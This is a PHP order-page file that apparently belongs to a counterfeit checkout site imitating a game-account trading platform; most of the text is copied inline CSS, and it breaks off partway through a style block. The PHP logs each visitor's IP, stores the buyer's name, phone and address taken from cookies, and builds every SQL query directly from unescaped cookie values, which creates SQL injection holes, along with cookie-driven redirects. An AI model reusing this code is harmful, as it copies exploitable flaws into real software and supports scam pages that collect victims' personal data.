
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);
$xzshijian=date('Y-m-d H:i:s', time());

if($_COOKIE['GoodsID3']){
	

	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);

	
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=2,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}' LIMIT 1") or die(mysql_error());
				
				
		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE 
					  useraddress
				  SET 
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE 
				uip='{$ip}'AND gid='{$_COOKIE['GoodsID3']}' LIMIT 1") or die(mysql_error());
				
			}
		}	
		  _close();
		  session_destroy();
		  
	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

if($_GoodsID['pay_fangshi']==1){
$pay_fangshi111="style='display:none'";
$payzz="style='display:none'";
}
if($_GoodsID['pay_fangshi']==2){
$pay_fangshi222="style='display:none'";
$payww="style='display:none'";
}
if($_GoodsID['pay_fangshi']==3){
$pay_fangshi111="";
$pay_fangshi222="";
$payww="style='display:none'";
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" data-dpr="1" style="font-size: 41.1px;"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <meta name="format-detection" content="telephone=no">
    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no ,viewport-fit=cover">

<style>@font-face{font-family:jymiconfont;src:url("//at.alicdn.com/t/font_1210754_r184rjein5.eot");src:url("//at.alicdn.com/t/font_1210754_r184rjein5.eot?#iefix") format("embedded-opentype"),url("//at.alicdn.com/t/font_1210754_r184rjein5.woff") format("woff"),url("//at.alicdn.com/t/font_1210754_r184rjein5.ttf") format("truetype"),url("//at.alicdn.com/t/font_1210754_r184rjein5.svg#NextIcon") format("svg")}.jym-iconfont{display:inline-block;font-family:jymiconfont;font-style:normal;font-weight:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.jym-iconfont:before{display:inline-block;vertical-align:middle;text-align:center}.jym-iconfont-back:before{content:"\e662"}.jym-iconfont-closedx:before{content:"\e684"}.jym-iconfont-search:before{content:"\e610"}.jym-iconfont-qq:before{content:"\e655"}.jym-iconfont-weixin:before{content:"\e607"}.jym-iconfont-wechat-moments:before{content:"\e60f"}.jym-iconfont-weibo:before{content:"\e60e"}.jym-iconfont-qzone:before{content:"\e60d"}.jym-iconfont-os-pc:before{content:"\e603"}.jym-iconfont-os-ios:before{content:"\e602"}.jym-iconfont-os-android:before{content:"\e601"}.jym-iconfont-help:before{content:"\e60c"}.jym-iconfont-help-xy:before{content:"\e76b"}.jym-iconfont-arrow-right:before{content:"\e620"}.jym-iconfont-arrow-up:before{content:"\e63c"}.jym-iconfont-arrow-down:before{content:"\e63d"}.jym-iconfont-selected-blue:before{content:"\e628"}.jym-iconfont-log-code:before{content:"\e60b"}.jym-iconfont-log-phone:before{content:"\e60a"}.jym-iconfont-log-uc:before{content:"\e654"}.jym-iconfont-toselect:before{content:"\e627"}.jym-iconfont-edit:before{content:"\e612"}.jym-iconfont-table-arrow:before{content:"\e66b"}.jym-iconfont-select:before{content:"\e604"}.jym-iconfont-eye-close:before{content:"\e606"}.jym-iconfont-eye-open:before{content:"\e605"}.jym-iconfont-warning-line:before{content:"\e608"}.jym-iconfont-warning:before{content:"\e668"}.jym-iconfont-keybord:before{content:"\e621"}.jym-iconfont-keybord-smile:before{content:"\e61e"}.jym-iconfont-keybord-pic:before{content:"\e647"}.jym-iconfont-keybord-delete:before{content:"\e648"}.jym-iconfont-remark:before{content:'\e62b'}.jym-iconfont-logo:before{content:'\e62e'}.jym-iconfont-offline:before{content:'\e62d'}.jym-iconfont-online:before{content:'\e628'}.jym-iconfont-order:before{content:'\e62f'}.jym-iconfont-server:before{content:'\e62a'}.jym-iconfont-user:before{content:'\e630'}.jym-iconfont-pic-prev:before{content:'\e670'}.jym-iconfont-pic-next:before{content:'\e620'}.jym-iconfont-phone-list:before{content:'\e66e'}.jym-iconfont-phone-msg:before{content:'\e71a'}.jym-iconfont-phone-call:before{content:'\e631'}.jym-iconfont-star:before{content:'\e633'}.jym-iconfont-star-light:before{content:'\e632'}.jym-iconfont-kefu:before{content:'\e76f'}.jym-iconfont-home:before{content:'\e613'}.jym-iconfont-share:before{content:'\e614'}.jym-iconfont-title-share:before{content:'\e617'}.jym-iconfont-download::before{content:'\e63a'}.jym-iconfont-hj::before{content:'\e640'}.jym-iconfont-nav-kefu::before{content:'\e74b'}.jym-iconfont-zu-back::before{content:'\e752'}.jym-iconfont-zu-home::before{content:'\e750'}.jym-iconfont-zu-share::before{content:'\e751'}.jym-iconfont-zu-quick::before{content:'\e753'}.jym-iconfont-zu-real::before{content:'\e754'}.jym-iconfont-zu-auth::before{content:'\e755'}.jym-iconfont-zu-auth-name::before{content:'\e756'}.jym-iconfont-zu-auth-man::before{content:'\e757'}.jym-iconfont-nav-back:before{content:"\e74e"}.jym-iconfont-selected-red:before{content:"\e6d4"}.jym-iconfont-tag-channel:before{content:"\e616"}.jym-iconfont-post-share:before{content:"\e617"}.jym-iconfont-post-comment:before{content:"\e61a"}.jym-iconfont-post-main-content:before{content:"\e622"}.jym-iconfont-post-like:before{content:"\e618"}.jym-iconfont-post-like-selected:before{content:"\e61b"}.jym-iconfont-post-video-play:before{content:"\e61f"}.jym-iconfont-post-video-play-count:before{content:"\e61d"}.jym-iconfont-post-follow:before{content:"\e624"}.jym-iconfont-te-face:before{content:"\e61e"}.jym-iconfont-te-keyboard:before{content:"\e621"}.jym-iconfont-te-error:before{content:"\e629"}.jym-iconfont-trash:before{content:"\e61c"}.jym-iconfont-view-more:before{content:"\e625"}.jym-iconfont-more-operate:before{content:"\e646"}.jym-iconfont-add-pic:before{content:"\e653"}.jym-iconfont-input-clean:before{content:"\e65d"}.jym-iconfont-edit2:before{content:"\e62b"}.jym-iconfont-followed-people:before{content:"\e62c"}.jym-iconfont-im-link:before{content:"\e635"}.jym-iconfont-im-link-blue:before{content:"\e635"}.jym-iconfont-authorize-agree:before{content:"\e628"}.jym-iconfont-tick-triangle:before{content:"\e626"}.jym-iconfont-choose:before{content:"\e660"}.jym-iconfont-wait:before{content:"\e666"}.jym-iconfont-fail-circle:before{content:"\e629"}.jym-iconfont-dailian-order:before{content:"\e62a"}.jym-iconfont-complete:before{content:"\e776"}.jym-iconfont-unfold:before{content:"\e658"}.jym-iconfont-order-shop:before{content:"\e634"}.jym-iconfont-see-open:before{content:"\e636"}.jym-iconfont-see-close:before{content:"\e637"}.jym-iconfont-order-seller:before{content:"\e638"}.jym-iconfont-post-pin:before{content:"\e639"}.jym-iconfont-s2{font-size:.48rem}.jym-iconfont-s1{font-size:.42667rem}.jym-iconfont-s3{font-size:.96rem}.jym-iconfont-collect:before{content:"\e63b"}.jym-iconfont-collected:before{content:"\e63e"}.jym-iconfont-share-u:before{content:"\e63f"}.jym-iconfont-tab-option:before{content:"\e644"}.jym-iconfont-homepage:before{content:"\e642"}.jym-iconfont-blacklist:before{content:"\e643"}.jym-iconfont-kefu-1::before{content:'\e74b'}.jym-iconfont-photo::before{content:'\e75a'}.jym-iconfont-toggle::before{content:'\e649'}.jym-iconfont-2m::before{content:'\e645'}.jym-iconfont-arrow-red::before{content:'\e64a'}.jym-iconfont-up-arrow:before{content:'\e64a'}.jym-iconfont-user-report:before{content:'\e75b'}.jym-iconfont-retry:before{content:'\e64c'}.jym-iconfont-explain:before{content:'\e748'}.jym-iconfont-question:before{content:'\e611'}.jym-iconfont-ban-qq:before{content:'\e75d'}.jym-iconfont-lock:before{content:'\e75e'}.jym-iconfont-bank-card:before{content:'\e75c'}.jym-iconfont-compete:before{content:'\e75f'}.jym-iconfont-more::before{content:'\e64d'}.jym-iconfont-on-line::before{content:'\e615'}.jym-iconfont-notify::before{content:'\e762'}@font-face{font-family:jymiconfontV2;src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot");src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot?#iefix") format("embedded-opentype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.woff") format("woff"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.ttf") format("truetype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.svg#NextIcon") format("svg")}.clearfix{*zoom:1}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}@supports (bottom: constant(safe-area-inset-bottom)) or (bottom: env(safe-area-inset-bottom)){.safe-area-inset-bottom{padding-bottom:constant(safe-area-inset-bottom);padding-bottom:env(safe-area-inset-bottom)}}.jym-modal{position:relative}.jym-modal:not(.jym-modal-transparent):not(.jym-modal-popup){width:100%;height:100%}.jym-modal-mask{position:fixed;top:0;right:0;left:0;bottom:0;height:100%;z-index:1000;background-color:rgba(15,19,26,0.7)}.jym-modal-mask-hidden{display:none}.jym-modal-wrap{position:fixed;overflow:auto;top:0;right:0;bottom:0;left:0;height:100%;z-index:1000;-webkit-overflow-scrolling:touch;outline:0;display:flex;align-items:center;justify-content:center;transform:translateZ(1px)}.jym-modal-wrap-popup{display:block}.jym-modal-transparent{width:7.2rem}.jym-modal-transparent .jym-modal-content{border-radius:.18667rem}.jym-modal-nopadding .jym-modal-body{padding:0}.jym-modal-popup{position:fixed;left:0;width:100%}.jym-modal-popup-slide-down{top:0}.jym-modal-popup-slide-up{bottom:0}.jym-modal-popup .jym-modal-content{border-radius:.42667rem .42667rem 0 0}.jym-modal-title{margin:0;font-size:.48rem;font-weight:bold;color:#303133;text-align:center;line-height:1.2rem}.jym-modal-header{height:1.33333rem;line-height:1.33333rem;position:relative;padding-top:.13333rem;box-sizing:border-box}.jym-modal-content{position:relative;background-color:#fff;border:0;background-clip:padding-box;text-align:center;height:100%;overflow:hidden}.jym-modal-close{border:0;padding:0;background-color:transparent;outline:none;position:absolute;right:0;z-index:999;width:1.33333rem;height:1.2rem;margin-top:.13333rem}.jym-modal-close-x{display:inline-block;font-size:.58667rem;font-family:jymiconfontV2;font-style:normal;font-weight:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.jym-modal-close-x:before{display:inline-block;vertical-align:middle;text-align:center;content:'\e76b'}.jym-modal-close-white .jym-modal-close-x{color:white}.jym-modal-body{padding:.8rem;height:100%;overflow:auto}.xianyu-modal .jym-modal-header{height:auto;line-height:1;padding-top:1.06667rem;border-bottom:none}.xianyu-modal .jym-modal-header:after{display:none !important}.xianyu-modal .jym-modal-title{font-size:.48rem}.xianyu-modal .jym-modal-close-x{color:#c1c1c1}.jym-modal-button{-webkit-touch-callout:none;flex:1;box-sizing:border-box;text-align:center;text-decoration:none;outline:none;color:#0FA8F5;font-size:.42667rem;height:1.30667rem;line-height:1.30667rem;display:block;width:auto;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.jym-modal-button:first-child{color:#8D9199}.jym-modal-button:last-child{color:#0FA8F5}.jym-modal-button:last-child{position:relative;border-left:1PX solid #E6E8EB}@media (min-resolution: 2dppx){html:not([data-scale]) .jym-modal-button:last-child{border-left:none}html:not([data-scale]) .jym-modal-button:last-child::before{content:'';position:absolute;background-color:#E6E8EB;display:block;z-index:1;top:0;right:auto;bottom:auto;left:0;width:1px;height:100%;transform-origin:100% 50%;transform:scaleX(0.5)}}@media (min-resolution: 2dppx) and (min-resolution: 3dppx){html:not([data-scale]) .jym-modal-button:last-child::before{transform:scaleX(0.33)}}.jym-modal-button-group-normal{display:flex;position:relative;border-top:1PX solid #E6E8EB}@media (min-resolution: 2dppx){html:not([data-scale]) .jym-modal-button-group-normal{border-top:none}html:not([data-scale]) .jym-modal-button-group-normal::before{content:'';position:absolute;background-color:#E6E8EB;display:block;z-index:1;top:0;right:auto;bottom:auto;left:0;width:100%;height:1px;transform-origin:50% 50%;transform:scaleY(0.5)}}@media (min-resolution: 2dppx) and (min-resolution: 3dppx){html:not([data-scale]) .jym-modal-button-group-normal::before{transform:scaleY(0.33)}}.jym-modal-alert-content,.jym-modal-propmt-content{zoom:1;overflow:hidden;font-size:.42667rem;color:#303133;line-height:1.5}.jym-modal-transparent.jym-modal-android .jym-modal-content{border-radius:.37333rem}.jym-modal-transparent.jym-modal-android .jym-modal-content .jym-modal-body{padding:.85333rem .96rem .64rem}.jym-modal-transparent.jym-modal-android .jym-modal-content .jym-modal-button:first-child{color:#222222}.am-icon{fill:currentColor;background-size:cover}.am-icon-lg{width:1.06667rem;height:1.06667rem}.am-icon-loading{animation:cirle-anim 1s linear infinite}@keyframes cirle-anim{100%{transform:rotate(360deg)}}.am-toast{position:fixed;width:100%;z-index:1000;font-size:.42667rem;text-align:center}.am-toast>span{max-width:50%}.am-toast-mask{height:100%;display:flex;justify-content:center;align-items:center;left:0;top:0;transform:translateZ(1px)}.am-toast-nomask{position:fixed;max-width:50%;width:auto;left:50%;top:50%;transform:translateZ(1px)}.am-toast-nomask .am-toast-notice{transform:translateX(-50%) translateY(-50%)}.am-toast-notice-content .am-toast-text{min-width:4rem;max-width:7.33333rem;line-height:1.5;border-radius:.13333rem;color:#fff;background-color:rgba(30,33,51,0.8);padding:.53333rem}.toaster-loading img{width:1.06667rem;height:1.06667rem;margin:0 auto .34667rem}.toaster-ok .iconfont-choose:first-child{font-size:1.06667rem;color:#0ACC6B}.toaster-ok .sub-content{font-family:PingFangSC-Medium;font-size:.37333rem;color:#C0C4CC;text-align:center;line-height:.53333rem}.jym-button{display:block;outline:0 none;-webkit-appearance:none;box-sizing:border-box;padding:0;text-align:center;font-size:.42667rem;height:1.33333rem;line-height:1.33333rem;position:relative;overflow:hidden;text-overflow:ellipsis;word-break:break-word;white-space:nowrap;color:#fff;background-color:#05B4FF;border-radius:.66667rem;cursor:pointer}.jym-button-borderfix:before{transform:scale(0.49) !important}.jym-button-disabled{opacity:.2}.jym-button-warning{background-image:linear-gradient(135deg, #FF9B05 0%, #FF5805 100%);color:#fff}.jym-button-main-light{background:#F0FAFF}.jym-button-icon{display:flex;align-items:center;justify-content:center}.jym-button>.jym-button-icon{margin-right:0.5em}.jym-button-inline{display:inline-block}.jym-button-inline.jym-button-md{padding:0 .74667rem}.jym-button-md{height:1.06667rem;line-height:1.06667rem;font-size:.37333rem;border-radius:.53333rem}.jym-button-small{font-size:.37333rem;height:.8rem;line-height:.77333rem;padding:0 .26667rem}.jym-button-mini{font-size:.32rem;height:.64rem;line-height:.64rem}.jym-button-primary{background:#fff;color:#303133;border:1px solid #E6E8EB}.jym-button-primary:hover{color:#303133}.jym-button-secondary{background:#F0FAFF;color:#0FA8F5}.jym-button-secondary:hover{color:#0FA8F5}.jym-button-secondary-black{background:#F5F7FA;color:#303133}.jym-button-ghost{background:transparent;border:1px solid #3bf;border-radius:.66667rem;color:#0FA8F5}.jym-button-ghost:hover{color:#0FA8F5}.jym-button-ghost-disable{background:transparent;border:1px solid #E6E8EB;border-radius:.66667rem;color:#8D9199}.jym-button-ghost-disable:hover{color:#8D9199}.jym-button-ghost-white{background:transparent;border:1px solid #fff;border-radius:.66667rem;color:#fff}.jym-button-ghost-white:hover{color:#fff}.jym-button-blue{background-color:#05B4FF;background-image:none}.jym-button-block{width:100%;border-radius:0;border:none}.jym-button-btns{display:flex}.jym-button-btns-item{flex:1;margin:0 .18667rem}.jym-button-btns-item:first-child{margin-left:0}.jym-button-btns-item:last-child{margin-right:0}.jym-button-clicked{background-image:linear-gradient(-135deg, #C0C4CC 0%, #D7D9DB 100%)}.jym-button-clicked:hover{color:#fff;opacity:1}.jym-button-clicked.jym-button-disabled{opacity:1}.jym-button-full{display:block;width:100%;height:1.33333rem;line-height:1.33333rem;font-size:.48rem;text-align:center;color:#fff;background-image:linear-gradient(315deg, #078AFD 0%, #04A3FE 40%, #00C7FF 100%);background-color:#078AFD}.jym-button-full-disabled{background-image:linear-gradient(315deg, #CFE8FF 0%, #D0EDFF 40%, #D0F4FF 100%)}.jym-button-full.jym-button-full-fm{background-color:#EB544D;background-image:none}@font-face{font-family:jymiconfontV2;src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot");src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot?#iefix") format("embedded-opentype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.woff") format("woff"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.ttf") format("truetype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.svg#NextIcon") format("svg")}.jym-iconfontV2{display:inline-block;font-family:jymiconfontV2;font-style:normal;font-weight:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.jym-iconfontV2:before{display:inline-block;vertical-align:middle;text-align:center}.jym-iconfontV2-goods-name:before{content:"\e778"}.jym-iconfontV2-goods-tick:before{content:"\e777"}.jym-iconfontV2-more-link:before{content:"\e776"}.jym-iconfontV2-more-key:before{content:"\e775"}.jym-iconfontV2-nav-share:before{content:"\e774"}.jym-iconfontV2-nav-back:before{content:"\e773"}.jym-iconfontV2-more:before{content:"\e772"}.jym-iconfontV2-pop-report:before{content:"\e771"}.jym-iconfontV2-question:before{content:"\e770"}.jym-iconfontV2-pop-message:before{content:"\e77e"}.jym-iconfontV2-pop-home:before{content:"\e76e"}.jym-iconfontV2-ios:before{content:"\e76d"}.jym-iconfontV2-nav-collection:before{content:"\e76c"}.jym-iconfontV2-close:before{content:"\e76b"}.jym-iconfontV2-q:before{content:"\e76a"}.jym-iconfontV2-goods-people:before{content:"\e769"}.jym-iconfontV2-goods-zhima:before{content:"\e768"}.jym-iconfontV2-goods-collect:before{content:"\e766"}.jym-iconfontV2-good-beg:before{content:"\e765"}.jym-iconfontV2-table-tick:before{content:"\e77a"}.jym-iconfontV2-table-arrow:before{content:"\e779"}.jym-iconfontV2-received:before{content:"\e77b"}.jym-iconfontV2-collect-pre:before{content:"\e77c"}.jym-iconfontV2-wait:before{content:"\e783"}.jym-iconfontV2-cancel:before{content:"\e782"}.jym-iconfontV2-receiving:before{content:"\e781"}.jym-iconfontV2-record:before{content:"\e780"}.jym-iconfontV2-deliver:before{content:"\e77f"}.jym-iconfontV2-message:before{content:"\e77e"}.jym-iconfontV2-received-text:before{content:"\e77d"}.jym-iconfontV2-unfold:before{content:"\e620"}.jym-iconfontV2-selected:before{content:"\e621"}.jym-iconfontV2-unSelected::before{content:"\e784"}.jym-iconfontV2-bell::before{content:"\e607"}.jym-iconfontV2-zan:before{content:"\e60b"}.jym-iconfontV2-successful:before{content:"\e609"}.jym-iconfontV2-warning-black:before{content:"\e623"}.jym-iconfontV2-notice:before{content:"\e607"}.jym-iconfontV2-pc:before{content:"\e613"}.jym-iconfontV2-android:before{content:"\e767"}.jym-iconfontV2-order-list-seller:before{content:"\e60a"}.jym-iconfontV2-open-eyes:before{content:"\e624"}.jym-iconfontV2-close-eyes:before{content:"\e625"}.jym-iconfontV2-checkbox-nor:before{content:"\e784"}.jym-iconfontV2-reflesh:before{content:"\e60d"}.jym-iconfontV2-service:before{content:"\e60c"}.jym-iconfontV2-enlarge:before{content:"\e60f"}.format-price{color:#FF301A;font-weight:bold}.format-price .price-10{font-size:.26667rem}.format-price .price-12{font-size:.32rem}.format-price .price-13{font-size:.34667rem}.format-price .price-14{font-size:.37333rem}.format-price .price-16{font-size:.42667rem}.format-price .price-18{font-size:.48rem}.format-price .price-20{font-size:.53333rem}.format-price .price-22{font-size:.58667rem}.format-price .price-24{font-size:.64rem}.format-price .suffix-part{font-weight:normal;color:#FF4040}.lottieload{width:.8rem;margin:0 auto}.toaster-loading{padding:.13333rem 0}.toaster-loading .lottieload{margin-bottom:.42667rem}a{text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}.jym-pay-am-modal .jym-modal-content .jym-modal-header::after{background:none}.jym-pay-am-modal .jym-modal-content .jym-modal-body{padding-left:.42667rem;padding-right:.42667rem;padding-top:0}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container{color:#303133}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-description{font-size:.32rem;color:#8D9199;margin-bottom:.13333rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-description .result-second{color:#303133}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .jym-button{height:1.06667rem !important;line-height:1.06667rem !important}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-price{margin-bottom:.53333rem;line-height:1.36rem;height:1.36rem;font-size:.64rem;font-weight:bold}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-price .count-up-price{font-size:1.06667rem;margin-left:.10667rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-price .format-price{color:#303133}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-price .currency-symbol{font-size:.64rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-price .decimal-part{font-size:.8rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-price .integer-part{font-size:1.06667rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list{min-height:4.26667rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item{display:flex;justify-content:space-between;align-items:center;margin-bottom:.58667rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item .pay-method-image{width:1.06667rem;height:1.06667rem;flex-shrink:0}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item .pay-method-content{display:flex;flex-direction:column;align-items:baseline;margin:0 .26667rem;margin-left:.21333rem;justify-content:space-between;flex:1}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item .pay-method-content .pay-label{font-size:.37333rem;color:#303133;display:flex;flex-direction:column;justify-content:space-between}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item .pay-method-content .pay-label .pay-tips{position:absolute;background:#FF3333;color:#fff;font-size:.32rem;padding:.02667rem .05333rem;border-radius:.05333rem;margin-left:.21333rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item .pay-method-content .pay-desc{font-size:.32rem;color:#8D9199;margin-top:.16rem}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item .iconfont-selected{font-size:.53333rem;color:#0FA8FA;font-style:normal}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .pay-method-list .pay-method-item .icon-normal{width:.48rem;height:.48rem;border:.02667rem solid #C0C4CC;border-radius:50%}.jym-pay-am-modal .jym-modal-content .jym-modal-body .jym-pay-container .show-text{color:#8D9199;margin-bottom:1.6rem;display:inline-block;background-size:.32rem .32rem;background-repeat:no-repeat;background-position:center right;padding:0rem .53333rem}.jym-pay-cancel-confirm{font-family:'PingFangSC-Regular'}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-header{padding-top:0;height:1.73333rem;line-height:1.73333rem}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-header .jym-modal-title{font-size:.48rem;height:1.73333rem;line-height:1.73333rem;font-weight:bold}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-header::after{background:none}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-body{font-family:'PingFangSC-Regular';padding:0;font-weight:400;font-size:.42667rem}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-body .modal-description{padding:.53333rem;padding-top:0}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-body .pay-modal-btns{display:flex;border:.02667rem solid #E6E8EB;box-sizing:border-box;height:1.33333rem !important;line-height:1.33333rem !important;color:#8D9199}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-body .pay-modal-btns>a{flex-shrink:0;flex:1;color:#8D9199;font-weight:bold}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-body .pay-modal-btns>a:last-child{color:#05B4FF;border-left:.02667rem solid #E6E8EB}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-footer{font-weight:400;font-family:'PingFangSC-Regular'}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-footer .jym-modal-button{height:1.06667rem !important;line-height:1.06667rem !important;font-weight:bold;color:#8D9199}.jym-pay-cancel-confirm .jym-modal-content .jym-modal-footer .jym-modal-button:last-child{color:#0FA8FA}.am-toast-notice .am-toast-notice-content{text-align:center}.am-toast-notice .am-toast-notice-content .toaster-loading{min-width:2.13333rem}.am-toast-notice .am-toast-notice-content .toaster-loading .lottieload{width:1.33333rem;height:1.33333rem;margin:0 auto}.am-toast-notice .am-toast-notice-content .am-toast-text{min-width:auto;max-width:3.2rem;font-size:.37333rem;padding:.42667rem}.jym-modal-mask{transform:translateZ(1px)}
</style><style>@font-face{font-family:jymiconfontV2;src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot");src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot?#iefix") format("embedded-opentype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.woff") format("woff"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.ttf") format("truetype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.svg#NextIcon") format("svg")}.jym-iconfontV2{display:inline-block;font-family:jymiconfontV2;font-style:normal;font-weight:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.jym-iconfontV2:before{display:inline-block;vertical-align:middle;text-align:center}.jym-iconfontV2-goods-name:before{content:"\e778"}.jym-iconfontV2-goods-tick:before{content:"\e777"}.jym-iconfontV2-more-link:before{content:"\e776"}.jym-iconfontV2-more-key:before{content:"\e775"}.jym-iconfontV2-nav-share:before{content:"\e774"}.jym-iconfontV2-nav-back:before{content:"\e773"}.jym-iconfontV2-more:before{content:"\e772"}.jym-iconfontV2-pop-report:before{content:"\e771"}.jym-iconfontV2-question:before{content:"\e770"}.jym-iconfontV2-pop-message:before{content:"\e77e"}.jym-iconfontV2-pop-home:before{content:"\e76e"}.jym-iconfontV2-ios:before{content:"\e76d"}.jym-iconfontV2-nav-collection:before{content:"\e76c"}.jym-iconfontV2-close:before{content:"\e76b"}.jym-iconfontV2-q:before{content:"\e76a"}.jym-iconfontV2-goods-people:before{content:"\e769"}.jym-iconfontV2-goods-zhima:before{content:"\e768"}.jym-iconfontV2-goods-collect:before{content:"\e766"}.jym-iconfontV2-good-beg:before{content:"\e765"}.jym-iconfontV2-table-tick:before{content:"\e77a"}.jym-iconfontV2-table-arrow:before{content:"\e779"}.jym-iconfontV2-received:before{content:"\e77b"}.jym-iconfontV2-collect-pre:before{content:"\e77c"}.jym-iconfontV2-wait:before{content:"\e783"}.jym-iconfontV2-cancel:before{content:"\e782"}.jym-iconfontV2-receiving:before{content:"\e781"}.jym-iconfontV2-record:before{content:"\e780"}.jym-iconfontV2-deliver:before{content:"\e77f"}.jym-iconfontV2-message:before{content:"\e77e"}.jym-iconfontV2-received-text:before{content:"\e77d"}.jym-iconfontV2-unfold:before{content:"\e620"}.jym-iconfontV2-selected:before{content:"\e621"}.jym-iconfontV2-unSelected::before{content:"\e784"}.jym-iconfontV2-bell::before{content:"\e607"}.jym-iconfontV2-zan:before{content:"\e60b"}.jym-iconfontV2-successful:before{content:"\e609"}.jym-iconfontV2-warning-black:before{content:"\e623"}.jym-iconfontV2-notice:before{content:"\e607"}.jym-iconfontV2-pc:before{content:"\e613"}.jym-iconfontV2-android:before{content:"\e767"}.jym-iconfontV2-order-list-seller:before{content:"\e60a"}.jym-iconfontV2-open-eyes:before{content:"\e624"}.jym-iconfontV2-close-eyes:before{content:"\e625"}.jym-iconfontV2-checkbox-nor:before{content:"\e784"}.jym-iconfontV2-reflesh:before{content:"\e60d"}.jym-iconfontV2-service:before{content:"\e60c"}.jym-iconfontV2-enlarge:before{content:"\e60f"}.real-user-verify .dialog-mask{width:100%;height:100%;background:rgba(0,0,0,0.4)}.real-user-verify.dialog-container{position:fixed;left:0;top:0;height:100%;width:100%}.real-user-verify .dialog-box{position:absolute;left:50%;top:50%;width:auto;background:#fff;padding:16px 24px;border-radius:4px;display:inline-block;margin-left:0;min-width:384px;box-sizing:border-box;transform:translate(-50%, -50%)}.real-user-verify .dialog-title{font-size:16px;color:#303133;line-height:24px;margin-bottom:12px;font-weight:500}.real-user-verify .dialog-content{font-size:14px;color:rgba(0,0,0,0.65);line-height:22px}.real-user-verify .dialog-comfirm{padding:0px 